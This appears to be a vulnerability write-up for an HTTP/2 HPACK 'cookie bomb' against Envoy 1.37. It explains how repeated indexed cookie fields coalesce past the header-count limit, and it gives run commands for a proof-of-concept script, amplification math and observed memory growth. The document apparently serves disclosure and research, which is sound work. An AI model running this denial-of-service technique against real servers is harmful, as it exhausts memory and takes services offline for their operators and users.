# Amplification Factors

This repro is cookie-specific. Envoy's default `max_headers_count=100` blocks
the generic many-header HPACK bomb, but repeated HTTP/2 `cookie` fields are
coalesced into `StreamImpl::cookies_` before one final `cookie` header is
inserted into the header map.

## HPACK Entry

The PoC inserts one dynamic table entry:

```text
name:  cookie        6 bytes
value: "x" * 4058   4058 bytes
HPACK entry size: name + value + 32 = 4096 bytes
```

This exactly fits Envoy's default HPACK dynamic table size. The new entry is
then referenced as dynamic index `62`. For index `62`, HPACK indexed
representation is a single byte: `0xbe`.

## Per Reference

Each indexed reference costs one byte on the wire and is decoded as another
`cookie` header field. Envoy does not insert each cookie crumb into the header
map. Instead, it appends into a per-stream `cookies_` buffer:

```text
first crumb:      4058 bytes
later crumbs:     2 byte delimiter "; " + 4058 byte value = 4060 bytes
wire cost/ref:    1 byte
logical expansion per repeated ref: about 4060:1
```

The final coalesced `cookie` header is inserted only once at end-of-headers, so
the normal header-count limit sees one cookie header, not tens of thousands of
cookie crumbs.

## Default Run

Command:

```bash
./hpack_cookie_bomb.py --connections 1 --streams 1 --refs 32768 --cookie-value-size 4058 --hold 20
```

Client-side math:

```text
indexed references:         32768
cookie crumbs total:        32769
header block bytes:         36844
coalesced cookie bytes:     (32769 * 4058) + (32768 * 2)
                           = 133042138 bytes
                           = 126.9 MiB
logical cookie/wire ratio:  133042138 / 36844
                           = about 3611:1
```

Observed local Podman result against `envoyproxy/envoy:v1.37-latest`
(`envoy 1.37.2`):

```text
baseline memory:            25.54 MB
peak during hold:           234.8 MB
observed delta:             about 209 MB
wire header block:          36844 bytes
observed RSS delta/wire:    about 5700:1
http2.header_overflow:      0
inbound flood counters:     0
```

The observed RSS ratio is larger than the logical coalesced-cookie ratio because
the append path and allocator reserve/copy memory while growing the cookie
buffer.

## Scaling

Approximate per-stream logical expansion with default values:

```text
refs=8192:   12268 byte header block -> 31.7 MiB cookie
refs=32768:  36844 byte header block -> 126.9 MiB cookie
```

The PoC can also open multiple streams/connections:

```bash
./hpack_cookie_bomb.py --connections 2 --streams 4 --refs 32768 --cookie-value-size 4058 --hold 30
```

Use small values first; memory growth is intentionally steep.
